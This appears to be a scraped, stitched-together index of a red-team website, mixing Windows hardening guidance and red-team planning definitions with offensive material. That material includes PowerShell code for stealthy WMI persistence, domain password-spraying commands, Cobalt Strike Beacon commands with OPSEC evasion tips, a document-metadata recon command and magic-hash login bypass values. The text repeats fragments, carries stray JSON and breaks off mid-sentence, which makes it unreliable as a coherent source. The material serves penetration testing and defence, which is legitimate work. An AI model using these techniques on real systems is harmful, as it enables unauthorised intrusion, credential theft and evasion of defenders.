\"800-63-3: Digital Identity Guidelines\". Remove periodic password change requirements Passwords should only be changed if forgotten or suspected compromise Warning I don't agree with the two above and recommend maintaining a reasonable duration for password change requirements Remove complexity requirements (Upper/Lower/Number/Special character) Require a minimum password length of A minimum length of 8 is required by NIST, but minimum of 16 is recommended for user accounts A minimum length of 20 (28+ is recommended) for service accounts Suggest the use of pass-phrases (such as four random lowercase words). Example: \"correct horse battery staple!\" Screen passwords against password compromise lists Screen passwords against keyboard walks Note Meeting the complexity recommendation may not be possible due to current compliance requirements. Setting the Password Policy using GPO \u00b6 Edit the \"Domain Password Policy\" GPO to configure the appropriate password length 1 2 3 1. Open Group Policy 2. Computer Configurations > Policies > Windows Settings > Security Settings > Account Policy > Password Policy 3.

This should be monthly, quarterly (at most), or after an incident where compromise is suspected.

MSA's allow you to create an account in Active Directory that is tied to a specific computer. That account has its own complex password (see password policy) and is maintained automatically. This means that an MSA can run services on a computer in a secure and easy to maintain manner, while maintaining the capability to connect to network resources as a specific user principal. Group level MSA's can be deployed in Windows 2012 or higher Domains.

Windows Logs \u00b6 The Windows Logs category includes the logs that were available on previous versions of Windows: the Application, Security, and System logs. It also includes two new logs: the Setup log and the ForwardedEvents log. Windows logs are intended to store events from legacy applications and events that apply to the entire system. Application log \u00b6 The Application log contains events logged by applications or programs. For example, a database program might record a file error in the application log. Program developers decide which events to log. Security log \u00b6 The Security log contains events such as valid and invalid logon attempts, as well as events related to resource use, such as creating, opening, or deleting files or other objects. Administrators can specify what events are recorded in the security log. For example, if you have enabled logon auditing, attempts to log on to the system are recorded in the security log. Setup log \u00b6 The Setup log contains events related to application setup. System log \u00b6 The System log contains events logged by Windows system components. For example, the failure of a driver or other system component to load during startup is recorded in the system log. The event types logged by system components are predetermined by Windows. ForwardedEvents log \u00b6 The ForwardedEvents log is used to store events collected from remote computers. To collect events from remote computers, you must create an event subscription. To learn about event subscriptions, see Event Subscriptions. Applications and Services Logs \u00b6 Applications and Services logs are a new category of event logs. These logs store events from a single application or component rather than events that might have system wide impact. This category of logs includes four subtypes: Admin, Operational, Analytic, and Debug logs. Events in Admin logs are of particular interest to IT Professionals using the Event Viewer to troubleshoot problems. Events in the Admin log should provide you with guidance about how to respond to them. Events in the Operational log are also useful for IT Professionals, but they are likely to require more interpretation. Admin and Debug logs are not as user friendly. Analytic logs store events that trace an issue and, often, a high volume of events are logged. Debug logs are used by developers when debugging applications. Both Analytic and Debug logs are hidden and disabled by default. To make these logs visible, follow the steps in Show or Hide Analytic and Debug Logs. To enable these logs, follow the steps in Enable Analytic and Debug Logs. Admin \u00b6 These events are primarily targeted at end users, administrators, and support personnel. The events that are found in the Admin channels indicate a problem and a well-defined solution that an administrator can act on. An example of an admin event is an event that occurs when an application fails to connect to a printer. These events are either well documented or have a message associated with them that gives the reader direct instructions of what must be done to rectify the problem. Operational \u00b6 Operational events are used for analyzing and diagnosing a problem or occurrence. They can be used to trigger tools or tasks based on the problem or occurrence. An example of an operational event is an event that occurs when a printer is added or removed from a system. Analytic \u00b6 Analytic events are published in high volume. They describe program operation and indicate problems that cannot be handled by user intervention. Debug \u00b6 Debug events are used by developers troubleshooting issues with their programs. Advanced Audit Policy should focus on these (in no specific order) \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 1. A logon was attempted using explicit credentials: Event 552 and 4648 2.

Disable Unneeded Services \u00b6 The document Service-management-WS2016.xlsx contains a list default services, their state, use, and if it is safe to disable. Review the Services outlined in the document Service-management-WS2016.xlsx Create a list of service to disable, and enforce via GPO Disable Net Session Enumeration (NetCease) \u00b6 This hardening process prevents attackers from easily getting some valuable recon information to move laterally within their victim's network. Run the NetCease PowerShell script on Server Include DCs, Fileservers, or other servers where Session information may be used by and attacker for enumeration References https://gallery.technet.microsoft.com/Net-Cease-Blocking-Net-1e8dcb5b https://adsecurity.org/?p=3299 Disable WPAD \u00b6 Web Proxy Auto-Discovery Protocol (WPAD) is \"a method used by clients to locate the URL of a configuration file using DHCP and/or DNS discovery methods. Once detection and download of the configuration file is complete, it can be executed to determine the proxy for a specified URL.\" Disable WPAD via Group Policy by deploying the following registry change: HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionInternet SettingsWpadNew DWORD (32-Bit Value) called \"WpadOverride\" and set to \"1\" Disable the service \"WinHTTP Web Proxy Auto-Discovery Service\" Computer Configuration>Policies>Windows Settings>Security Settings>System ServicesSet WinHTTP Web Proxy Auto-Discovery Service to Disabled Note: Partial mitigation of WPAD issues is possible by installing the Microsoft patch KB3165191 (MS16-077). This patch hardens the WPAD process and when the system responds to NetBIOS requests. Disable LLMNR \u00b6 Link-Local Multicast Name Resolution (LLMNR): In a nutshell, Link-Local Multicast Name Resolution (LLMNR) resolves single label names (like: COMPUTER1), on the local subnet, when DNS is unable to resolve the name. Disable LLMNR via Group Policy by deploying the following: Group Policy:Computer Configuration/Administrative Templates/Network/DNS ClientSet \"Turn Off Multicast Name Resolution\" to \"Enabled\" Disable WDigest \u00b6 WDigest provides support for Digest authentication which is: \"An industry standard that is used in Windows Server 2003 for Lightweight Directory Access Protocol (LDAP) and Web authentication. Digest Authentication transmits credentials across the network as an MD5 hash or message digest.\" Prior to Windows 8.1 and Windows Server 2012 R2, Wdigest was enabled which placed the user's \"clear text\" password in LSASS memory space in order to support basic authentication scenarios. Windows 8.1 and Windows Server 2012 R2 and newer have WDigest disabled by default. Disable WDigest via Group Policy by deploying the following registry change: HKEY_LOCAL_MACHINESystemCurrentControlSetControlSecurityProvidersWdigestUseLogonCredential = \"0\" References https://adsecurity.org/?p=3299 Remove the use of NTLM v1 \u00b6 Windows Server 2008 R2 included features to help identify NTLM authentication use on the network. It is important to completely remove these legacy authentication protocols since they are insecure. Removal and prevention of LM and NTLMv1 use can be activated through the use of Group Policy security settings. Plan to move to NTLMv2 and Kerberos at the least, with the long-term goal being Kerberos only. Audit the use of NTLM v1 on the network Determine the risks and need to support NTLM v1 Disable the use of NTLM v1 Reference https://technet.microsoft.com/en-us/library/jj865674(v=ws.10).aspx https://technet.microsoft.com/en-us/library/dd560653%28v=ws.10%29.aspx Consider other Mitigations \u00b6 Consider other mitigations detailed at https://adsecurity.org/?p=3299 References https://adsecurity.org/?p=3299 Deploy security back-port patch (KB2871997) \u00b6 Ensure all Windows systems prior to Windows 8.1 & Windows Server 2012 R2 have the KB2871997 patch installed. This patch updates earlier supported versions of Windows with security enhancements baked into Windows 8.1 & Windows Server 2012 R2. References https://adsecurity.org/?p=559 https://blogs.technet.microsoft.com/kfalde/2014/11/01/kb2871997-and-wdigest-part-1/ Prevent local \"administrator\" accounts from authenticating over the network \u00b6 While the local Administrator (RID 500) account on two different computers has a different SID, if they have the same account name and password, the local Administrator account from one can authenticate as Administrator on the other. The same is true with any local account that is duplicated on multiple computers. This presents a security issue if multiple (or all) workstations in an organization have the same account name and password since compromise of one workstation results in compromise of all. Windows 8.1 & Windows 2012 R2 and newer introduced two new local SIDs: S-1-5-113: NT AUTHORITYLocal account S-1-5-114: NT AUTHORITYLocal account and member of Administrators group These SIDs are also added in earlier supported versions of Windows by installing the KB2871997 patch.

As discussed in the Threat Mitigation Strategies Part 1 http://threatexpress.com/2018/01/threat-mitigation-strategies-observations-recommendations/ , there is commonality between the inherent weaknesses and the actions a threat might perform within an information system or network. The following recommendations and informational snippets were derived from many offensive and defensive efforts that continue to support these correlations. Each recommendation and snippet can and very likely should be applied to all networks. Some systems and networks will have exceptions; however, these are exceptions (not the status quo) and should be handled as such. Also note the exact syntax and use will vary with the network construct, operating system/version, and legal/regulatory security requirements.","title":"Threat Mitigation Strategies: Part 2"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#account-management","text":"Accounts should have specific roles.

This presents a security issue if multiple (or all) workstations in an organization have the same account name and password since compromise of one workstation results in compromise of all. Windows 8.1 & Windows 2012 R2 and newer introduced two new local SIDs: S-1-5-113: NT AUTHORITYLocal account S-1-5-114: NT AUTHORITYLocal account and member of Administrators group These SIDs are also added in earlier supported versions of Windows by installing the KB2871997 patch.

Rather than spending an exorbitant amount of time (that could be used building a custom C2) on an evaluation, I decided to perform a quick comparison of several popular C2 agents. Systems for testing included Ubuntu 16.04, Ubuntu 18.04, MacOS 10.14.6, and Windows 10 (Defender, CrowdStrike, Tanium, McAfee, and a custom defense agent) all fully patched and updated as of August 19,2019. This comparison is in no way a complete review, evaluation, or judgment on the validity of any agent. Rather it is a very quick assessment of my first take on each (think hours not months). I also acknowledge that if a function, feature, or build did not work after two consecutive attempts it was abandoned. All readers should note that building a C2 agent or framework isn't easy. Building one that can handle the types of actions a true Red Team may perform while avoiding defensive mechanisms or processes and ensuring effective functionality is tough!

Most of this is just a consolidation of publicly available information and things that Joe Vest ( @joevest ), Andrew Chiles ( @andrewchiles ), Derek Rushing, or myself ( @minis_io ) have found useful. Over time additional sections, section placeholders, snippets, and links were added for \"quick reference\" and has grown to quite a sizable markdown file. The more complex or longer sections will be separated into smaller more detailed write-ups; however, we decided to drop the short and generic info for public use now. Pasties data will also eventually be formatted and added to the wiki.

It can give a lot of important information by scanning the obtained files. It can generate an HTML page with the result of the metadata extracted, plus a list of potential usernames, very useful for preparing a brute force attack on open services like ftp, web application, VPN, pop3, etc. Metagoofil performs the following: Searches the given file type using the Google search engine Downloads all the documents found Extracts metadata from downloaded documents Saves the result in HTML file Perform document metadata searching on target domain using first 200 google results 1 metagoofil -d <target>.com -t pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx -l 200 -n 5 -o /tmp/metagoofil/ -f /tmp/metagoofil/result.html censys.io \u00b6 Censys is a search engine that allows computer scientists to ask questions about the devices and networks that compose the Internet.

This is checked by most AV! This value corresponds to files being loaded through the AppInit_DLLs Registry value. The AppInit_DLLs registry value contains a list of dlls that will be loaded when user32.dll is loaded. As most Windows executables use the user32.dll, that means that any DLL that is listed in the AppInit_DLLs registry key will be loaded also. This makes it very difficult to remove the DLL as it will be loaded within multiple processes, some of which can not be stopped without causing system instability. The user32.dll file is also used by processes that are automatically started by the system when you log on.

Three parts to this: * WMI Event Filter * Event Consumer * Filter/Consumer Binding This technique gets you SYSTEM level persistence, requires admin rights to execute. Autoruns doesn't even check for this yet. (doubt any AVs are either) Difficult to detect, Difficult to remove if you dont know what youre doing. WMI Event Filter \u00b6 Create an event that checks every 60 seconds for a change in Win32_PerfFormattedData_PerfOS_System. (this is always changing) 1 2 3 4 5 6 7 $EventFilter = ([WMICLASS]\"\\\\.\\root\\subscription:__EventFilter\").CreateInstance() $EventFilter.QueryLanguage = \"WQL\" $EventFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\" $EVentFilter.EventNamespace = \"root\\cimv2\" $EventFilter.Name = \"OBVIOUSHACKER\" $Result = $EventFilter.Put() $Filter = $Result.Path http://msdn.microsoft.com/en-us/library/aa394639(v=vs.85).aspx Event Consumer \u00b6 Configure what to execute once the event occurs.

By default it will automatically generate the userlist from the domain. BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS! Quick Start Guide \u00b6 Open a PowerShell terminal from the Windows command line with 'powershell.exe -exec bypass'. 1 Type 'Import-Module Invoke-DomainPasswordSpray.ps1'. The only option necessary to perform a password spray is either -Password for a single password or -PasswordList to attempt multiple sprays. When using the -PasswordList option Invoke-DomainPasswordSpray will attempt to gather the account lockout observation window from the domain and limit sprays to one per observation window to avoid locking out accounts. The following command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016. 1 PowerShell Invoke-DomainPasswordSpray -Password Winter2016 The following command will use the userlist at users.txt and try to authenticate to the domain \"domain-name\" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to one attempt during each window. The results of the spray will be output to a file called sprayed-creds.txt 1 PowerShell Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt Invoke-DomainPasswordSpray Options \u00b6 1 2 3 4 5 UserList - Optional UserList parameter. This will be generated automatically if not specified. Password - A single password that will be used to perform the password spray. PasswordList - A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts). OutFile - A file to output the results to. Domain - A domain to spray against.

This blog post surveys Beacons commands and provides background on which commands inject into remote processes, which commands spawn jobs, and which commands rely on cmd.exe or powershell.exe. API-only These commands are built-into Beacon and rely on Win32 APIs to meet their objectives. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 cd cp download drives exit getuid kerberos_ccache_use kerberos_ticket_purge kerberos_ticket_use jobkill kill link ls make_token mkdir mv ppid ps pwd rev2self rm rportfwd socks steal_token timestomp unlink upload House-keeping Commands The following commands are built into Beacon and exist to configure Beacon or perform house-keeping actions. Some of these commands (e.g., clear, downloads, help, mode, note) do not generate a task for Beacon to execute. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 cancel checkin clear downloads help jobs mode dns mode dns-txt mode dns6 mode http note powershell-import sleep socks stop spawnto Post-Exploitation Jobs (Process Execution + Remote Process Injection) Many Beacon post-exploitation features spawn a process and inject a capability into that process. Beacon does this for a number of reasons: (i) this protects the agent if the capability crashes, (ii) this scheme makes it seamless for an x86 Beacon to launch x64 post-exploitation tasks. The following commands run as post-exploitation jobs: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 browserpivot bypassuac covertvpn dcsync desktop elevate hashdump keylogger logonpasswords mimikatz net portscan powerpick psinject pth screenshot shspawn spawn ssh ssh-key wdigest OPSEC Advice: Use the spawnto command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe (you probably don\u2019t want that). The ppid command will change the parent process these jobs are run under as well. Process Execution These commands spawn a new process: 1 2 3 execute runas runu OPSEC Advice: The ppid command will change the parent process of commands run by execute. The ppid command does not affect runas or spawnu. Process Execution: Cmd.exe The shell command depends on cmd.exe. The pth and getsystem commands get honorable mention here. These commands rely on cmd.exe to pass a token to Beacon via a named pipe. OPSEC Advice: the shell command uses the COMSPEC environment variable to find the preferred command-line interpreter on Windows. Use Aggressor Script\u2019s &bsetenv function to point COMSPEC to a different cmd.exe location, if needed. Use the ppid command to change the parent process the command-line interpreter is run under. To pth without cmd.exe, execute the pth steps by hand. Process Execution: PowerShell.exe The following commands launch powershell.exe to perform some task on your behalf. 1 2 3 4 5 powershell spawnas spawnu winrm wmi OPSEC Advice: Use the ppid command to change the parent process powershell.exe is run under. Be aware, there are alternatives to each of these commands that do not use powershell.exe: 1 2 3 spawnu has runu which runs an arbitrary command under another process. spawnas has runas which runs an arbitrary command as another user. powershell has powerpick, this command runs powershell scripts without powershell.exe. It\u2019s also possible to laterally spread without the winrm and wmi commands. Remote Process Injection The post-exploitation job commands (previously mentioned) rely on process injection too. The other commands that inject into a remote process are: 1 2 3 dllinject inject shinject Service Creation The following internal Beacon commands create a service (either on the current host or a remote target) to run a command. These commands use Win32 APIs to create and manipulate services. 1 2 3 getsystem psexec psexec_psh Powershell Function Wrapper \u00b6 https://github.com/bluscreenofjeff/AggressorScripts/blob/master/powershell.cna https://bluescreenofjeff.com/2016-09-07-adding-easy-guis-to-aggressor-scripts/ Persistence Scripts \u00b6 https://github.com/ZonkSec/persistence-aggressor-script https://github.com/ZonkSec/persistence-aggressor-script/blob/master/persistence.cna EMPIRE \u00b6 Cheat sheets 1 2 - https://github.com/adaptivethreat/Empire/wiki/Quickstart - https://attackerkb.com/Powershell/Powershell_Empire Clone GIT Repo 1 2 root@workstation:~# git clone https://github.com/adaptivethreat/Empire.git empire Cloning into 'empire'...

Decompiling .NET Binaries \u00b6 http://ilspy.net/ Canary Tokens \u00b6 Tokens consist of a unique identifier (which can be embedded in either HTTP URLs or in hostnames.) Whenever that URL is requested, or the hostname is resolved, we send a notification email to the address tied to the token. You can get one in seconds, using just your browser. To obtain a token: 1 2 3 4 5 1. Visit http://canarytokens.org. 2. Enter your email address. (It's only used to notify you when the token is triggered, mails are not used for any other purpose.) 3. Enter a comment which describes where you're using the token. If the token is triggered in six months time, a comment will help you remember where you placed the token. Be specific (e.g. \"file watch on 192.168.100.2:/repos/repo3/README.txt\" or \"Password lure email in user@domain.com inbox\". We envisage having loads of tokens, so a good description is necessary. 4. Click \"Generate Token\" to obtain your token. 5. Copy the token and drop it somewhere it will be stumbled over.

When it is compared against the hash of the actual value, and if they both are treated as \u201c0\u201d and therefore evaluated as true, you will be able to log into the account without the valid password. This could be forced to happen in environments where automatic passwords are chosen for users during a forgot password flow and then attempting to log in immediately afterwards, as an example. https://example.com/login.php?user=bob&pass=240610708 Use Case 2: The attacker can simply take the example in the Hash column in the table below and use it as a value. In some cases these values are simply done as a look-up against known values (in memory, or perhaps dumped from a database and compared). By simply submitting the hash value, the magic hash may collide with other hashes which both are treated as \u201c0\u201d and therefore compare to be true.

Most of this is just a consolidation of publicly available information and things that Joe Vest ( @joevest ), Andrew Chiles ( @andrewchiles ), Derek Rushing, or myself ( @minis_io ) have found useful. Over time additional sections, section placeholders, snippets, and links were added for \"quick reference\" and has grown to quite a sizable markdown file. The more complex or longer sections will be separated into smaller more detailed write-ups; however, we decided to drop the short and generic info for public use now.

This blog post surveys Beacons commands and provides background on which commands inject into remote processes, which commands spawn jobs, and which commands rely on cmd.exe or powershell.exe. API-only These commands are built-into Beacon and rely on Win32 APIs to meet their objectives. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 cd cp download drives exit getuid kerberos_ccache_use kerberos_ticket_purge kerberos_ticket_use jobkill kill link ls make_token mkdir mv ppid ps pwd rev2self rm rportfwd socks steal_token timestomp unlink upload House-keeping Commands The following commands are built into Beacon and exist to configure Beacon or perform house-keeping actions. Some of these commands (e.g., clear, downloads, help, mode, note) do not generate a task for Beacon to execute. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 cancel checkin clear downloads help jobs mode dns mode dns-txt mode dns6 mode http note powershell-import sleep socks stop spawnto Post-Exploitation Jobs (Process Execution + Remote Process Injection) Many Beacon post-exploitation features spawn a process and inject a capability into that process. Beacon does this for a number of reasons: (i) this protects the agent if the capability crashes, (ii) this scheme makes it seamless for an x86 Beacon to launch x64 post-exploitation tasks. The following commands run as post-exploitation jobs: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 browserpivot bypassuac covertvpn dcsync desktop elevate hashdump keylogger logonpasswords mimikatz net portscan powerpick psinject pth screenshot shspawn spawn ssh ssh-key wdigest OPSEC Advice: Use the spawnto command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe (you probably don\u2019t want that). The ppid command will change the parent process these jobs are run under as well. Process Execution These commands spawn a new process: 1 2 3 execute runas runu OPSEC Advice: The ppid command will change the parent process of commands run by execute. The ppid command does not affect runas or spawnu. Process Execution: Cmd.exe The shell command depends on cmd.exe. The pth and getsystem commands get honorable mention here. These commands rely on cmd.exe to pass a token to Beacon via a named pipe. OPSEC Advice: the shell command uses the COMSPEC environment variable to find the preferred command-line interpreter on Windows. Use Aggressor Script\u2019s &bsetenv function to point COMSPEC to a different cmd.exe location, if needed. Use the ppid command to change the parent process the command-line interpreter is run under. To pth without cmd.exe, execute the pth steps by hand. Process Execution: PowerShell.exe The following commands launch powershell.exe to perform some task on your behalf. 1 2 3 4 5 powershell spawnas spawnu winrm wmi OPSEC Advice: Use the ppid command to change the parent process powershell.exe is run under. Be aware, there are alternatives to each of these commands that do not use powershell.exe: 1 2 3 spawnu has runu which runs an arbitrary command under another process. spawnas has runas which runs an arbitrary command as another user. powershell has powerpick, this command runs powershell scripts without powershell.exe. It\u2019s also possible to laterally spread without the winrm and wmi commands. Remote Process Injection The post-exploitation job commands (previously mentioned) rely on process injection too. The other commands that inject into a remote process are: 1 2 3 dllinject inject shinject Service Creation The following internal Beacon commands create a service (either on the current host or a remote target) to run a command. These commands use Win32 APIs to create and manipulate services. 1 2 3 getsystem psexec psexec_psh","title":"OPSEC Considerations for Beacon Commands"},{"location":"blogs/2019/penetration-testing-pasties/#powershell-function-wrapper","text":"https://github.com/bluscreenofjeff/AggressorScripts/blob/master/powershell.cna https://bluescreenofjeff.com/2016-09-07-adding-easy-guis-to-aggressor-scripts/","title":"Powershell Function Wrapper"},{"location":"blogs/2019/penetration-testing-pasties/#persistence-scripts","text":"https://github.com/ZonkSec/persistence-aggressor-script https://github.com/ZonkSec/persistence-aggressor-script/blob/master/persistence.cna","title":"Persistence Scripts"},{"location":"blogs/2019/penetration-testing-pasties/#empire","text":"Cheat sheets 1 2 - https://github.com/adaptivethreat/Empire/wiki/Quickstart - https://attackerkb.com/Powershell/Powershell_Empire Clone GIT Repo 1 2 root@workstation:~# git clone https://github.com/adaptivethreat/Empire.git empire Cloning into 'empire'...

Is it all the components defending a target network. The blue cell is typically comprised of blue team members, defenders, internal staff, and an organization\u2019s management. Blue Team \u00b6 A security team that defends against threats. Command and Control (C2) \u00b6 Command and Control (C2) is the influence an attacker has over a compromised computer system that they control. Engagement / Exercise Control Group (ECG) \u00b6 The Engagement (or Exercise) Control Group is ultimately responsible for all activities conducted during the engagement. Most often, the Engagement Control Group is composed of one or two senior managers from the target environment (for example a Chief Information Officer or Chief Operating Officer), one member from the Information Technology department of the environment, a White Cell liaison, and a Red Team liaison. More may be added as required. All must be Trusted Agents. Exfiltration \u00b6 Exfiltration is the extraction of information from a target. This is typically through a covert channel. IOC (Indicator of Compromise) \u00b6 Indicators of Compromise (IOCs) are artifacts that identify or describe threat actions. OPFOR \u00b6 An Opposing Force, or enemy force, that is typically used by the military in war-gaming scenarios. Red Teams are commonly associated with or support an OPFOR in war-gaming scenarios. Operational Impact \u00b6 An operational impact is the effect of a goal-driven action within a target environment. OPSEC \u00b6 OPSEC or Operational Security is a process that identifies critical information to determine if friendly actions can be observed by enemy intelligence, determines if information obtained by adversaries could be interpreted to be useful to them, and then executes selected measures that eliminate or reduce adversary exploitation of friendly critical information. In terms of Red Teaming, it is understanding what actions Blue can observe and minimizes exposure. Red Cell \u00b6 The term red cell is borrowed from the military. It is commonly associated with a group that plays OPFOR (opposing force) during red vs. blue exercises. A red cell is the components that make up the offensive portion of a red team engagement that simulates the strategic and tactical responses of a given target. The red cell is typically comprised of red team leads and operators and is commonly referred to as Red Team instead of Red Cell. Red Team \u00b6 A Red Team is an independent group that, from the perspective of a threat or adversary, explores alternative plans and operations to challenge an organizatio\u00f8n to improve its effectiveness. Red Team Lead \u00b6 Serves as the operational and administrative lead for the Red Team. Conducts engagement, budget, and resource management for the Red Team, Provides oversight and guidance for engagements, capabilities, and technologies. Ensures adherence to all laws, regulations, policies, and Rules of Engagement. Red Team Operator \u00b6 Complies with all Red Team requirements under the direction of the Red Team Lead. Operational executor of the engagement. Applies Red Team TTPs to the engagement. Provides technical research and capability to the Red Team. Keeps detailed logs during each phase of the engagement. Provides log and information support for creation of the final report ROE (Rules of Engagement) \u00b6 The Rules of Engagement establish the responsibilities, relationships, and guidelines among the Red Team, the customer, the system owner, and any stakeholders required for engagement execution. Threat \u00b6 A threat is an expression of intention to inflict evil, injury, or damage. Threat Emulation Threat Emulation is the process of mimicking the TTPs of a specific threat. Tradecraft \u00b6 Tradecraft is the techniques and procedures of espionage. Tradecraft is typically associated with the intelligence community. TTPs and Tradecraft are used interchangeably in this course. Trusted Agent (TA) \u00b6 The Trusted Agent\u2019s primary role is to limit irreversible damage and risk to life, limb, eyesight, and equipment; however, they are more often used to prevent the defenders from causing unexpected self-inflicted damage. A Trusted Agent (TA) has privileged and detailed knowledge of engagement activities, milestones, conditions, and the engagement status that would unduly bias or influence the actions of the environment staff and defenders. A Trusted Agent must protect all information from being provided to any party without the express approval of the Engagement Control Group. TTPs \u00b6 TTPs are Tactics, Techniques and Procedures (sometimes called Tools, Techniques, and Procedures). White Cell \u00b6 Serves as referee between Red Team activities and defender responses during an engagement. Controls the engagement environment/network. Monitors adherence to the ROE. Coordinates activities required to achieve engagement goals. Correlates Red Team activities with defensive actions. Ensures the engagement is conducted without bias to either side.","title":"Definitions"},{"location":"redteaming/definitions/#definitions","text":"","title":"Definitions"},{"location":"redteaming/definitions/#blue-cell","text":"The blue cell is the opposite side of red.

These are not all the same, and it is important that the security industry defines terms to establish a common understanding. To help with this, all threat-based security testing in this post will be referred to as Red Teaming. Definition: Red Teaming is the process of using tactics, techniques, and procedures (TTPs) to emulate a real-world threat with the goals of training and measuring the effectiveness of people, processes, and technology used to defend an environment. In other words, red teaming is the process of emulating a threat using realistic techniques with the goal of training blue teams and/or measuring security operations as a whole. Red teaming can provide a deep understand of the negative impacts an intelligent threat-actor can have against a target. Red Teaming in Perspective to Organizational Risk \u00b6 Security testing of any sort is ultimately about managing organization risk to threats. Using an inverse pyramid, we can illustrate the relationships between Red Teaming, Penetration Testing, and Vulnerability Assessments. This will help further define what Red Teaming IS and IS NOT. Vulnerability assessments tend to be wide in coverage but narrow in scope. Consider a vulnerability assessment of all enterprise workstations. The scope is very wide, but not very deep in context of organizational risks. What can be said about risk when flaws are found? Organizational risk can only be understood at the workstation level? Overall risk to an organization may be extrapolated to a small degree, but generally stays at that workstation level. Vulnerability assessments are good at reducing the attack surface but do not provide direct information in terms of organizational risk. Penetrations tests take vulnerability assessments to the next level by exploiting and proving out attack paths. Penetration tests can often look and feel like a red team engagement and even use some of the same tools or techniques. The key difference lies in the goals and intent. The goal of a penetration test is to execute an attack against a target system to identify and measure risks associated with the exploitation of a target\u2019s attack surface. Organizational risks can be indirectly measured and are typically extrapolated from some technical attack. What about the people and processes? This is where red teaming fits. Red Team Engagements are scenario based engagements driven by specific threat goals. Red teaming focuses on security operations as a whole and includes people, processes, and technology. Red teaming specifically focuses on goals related to training blue teams or measuring how security operations can impact a threat\u2019s ability to operate. Technical flaws are secondary to understanding how the threat was able to impact an organization\u2019s operations or how security operations was able to impact a threat\u2019s ability to operate. Bottom Line \u00b6 Vulnerability assessment and Penetration tests are a means to identify technical flaws with the ultimate goal of reducing a targets attack surface. Red teaming is a goal driven scenario used to train or measure blue. Red teaming goals lie in understanding security operations as a whole. people, processes, and technology.

At a minimum, ROE annexes should detail: The Target of the Engagement Organization name Address Specific groups or divisions Organizational identifiers Senior management contact info An Engagement Contact List (name, role, phone, email, office location) ECG personnel White Cell Trusted Agents Red Team Lead Red Tech Lead Engagement Objectives Conditions Threat level Targeted objectives Targets of opportunity Measures of success/failure Authorized Target Space Network The IP boundaries of the event Domains and/or workgroups Specific off-limits areas and resources (non-target intellectual property file share) Off-limits machines, networks, equipment, or applications (blacklist) Maintenance windows Physical Areas of the campus Buildings Offices Off-limits areas (e.g., the emergency services sector of a medical complex) Off-limits materials within the target space (e.g., sensitive documents or equipment) Authorized Actions: Types of activities approved for the engagement Restricted Actions: Types of activities restricted during the engagement (if any) The process for requesting approval of additional activities during engagement execution Approval process Points of contact (name, role, phone, email, office location) Alternate POC The ROE must be updated when the target space, authorized actions, objectives, or scope are changed. For instance, the original scope may be limited to computer network attacks. If physical attacks are planned, the ROE must be updated to reflect the additional activities and controls. The Red Team Lead will address suggestions or adjustments to the ROE. Each review result must be provided to the originator. The final ROE must be approved by a Trusted Agent in senior management of the target environment.","title":"Rules of Engagement (ROE) Guidance"},{"location":"redteaming/redteamplanning/tradecraft/","text":"Red Team Tradecraft and TTP Guidance \u00b6 This template should be used to define the overall guidance on Red Team Tradecraft and TTPs. Every Red Team should have a guidance document. Keep this document updated and distributed to all Red Team members. This document should be used to guide Red Team actions of all Red Team operators on all engagements. Exceptions to these rules can (and will) be made based on specific Rules of Engagement (ROE) or decision made by Red Team leads during an engagement. Exceptions should be documented as part of the engagement logging. It is important to use and follow this document to maintain a high-quality professional Red Team. Add custom or specific Tradecraft and TTP Guidance to this document as needed. This include specific or customs tools that should be used for various tasks, C2, enumeration, etc Guidance Do Don't Log all significant events Use untested tools on a target system Consult with peers Use unencrypted channels for C2 Understand tools and technology used Attempt to exploit or attack unencrypted websites Perform situational awareness Execute from non-executable locations Minimize callback (C2) volume Download restricted datasets Use binaries for initial access DO: LOG ALL SIGNIFICANT ACTIONS \u00b6 (SUCCESSES AND FAILURES) Log, log and log some more! Screenshot all significant actions including successful and failed attempts. One of the most important aspects of the Red Team engagement is the collection of data (a.k.a. logs). It is common that an inexperienced team completes an engagement with subpar documentation. Many actions are not fully captured, some actions are never captured, and often key failures are ignored. Each action performed provides value to the target as well as the target defenders. Incomplete logs prevent the Red Team from providing a complete and accurate depiction of the actions, obstacles, and defensive strengths and weaknesses of the target (i.e. mission failure). There are several methods to ensure logs are appropriately captured and stored: - Automated logging of the terminal: All terminal actions logged, timestamped and stored to a predefined location. - Tool logs: Most commercial tools have some capability to log actions and produce a raw and/or final report. - Custom tools logs: If you write a custom tool/script, it should output a log of actions and results. - Operator logs: By far this is the most important log. A log may show the action performed and the result; however, only the operator can accurately note the way the action was performed, what lead them to the decision, and their interpretation of the result. - Screenshots: Terminal logs are great for the operator and even better as supporting artifacts; however, they may mean nothing to senior level executives (and even some IT professionals). Screenshots before, during, and following the execution of an action hold much more weight than a terminal log, tool log, or operator log (often if may just be a screenshot of the terminal during execution). DO: CONSULT WITH PEERS \u00b6 No matter how long you have been performing IT or security, consult your peers before taking action. This is especially true during exploitation and command and control setup. Simple mistakes often lead to Red Team discovery too early in the engagement. Look at the command below. The command will be run as part of a tool written to provide general SA on a Linux system. What should the output look like? 1 netstat \u2013antb The command above is a netstat command that can be executed on a Windows host. Linux does not have the \"b\" option and produces an \"invalid option\" response. Think about it Have you ever typed ifconfig instead of ipconfig? Have you ever typed rm * in the wrong directory? Have you ever entered credentials only to 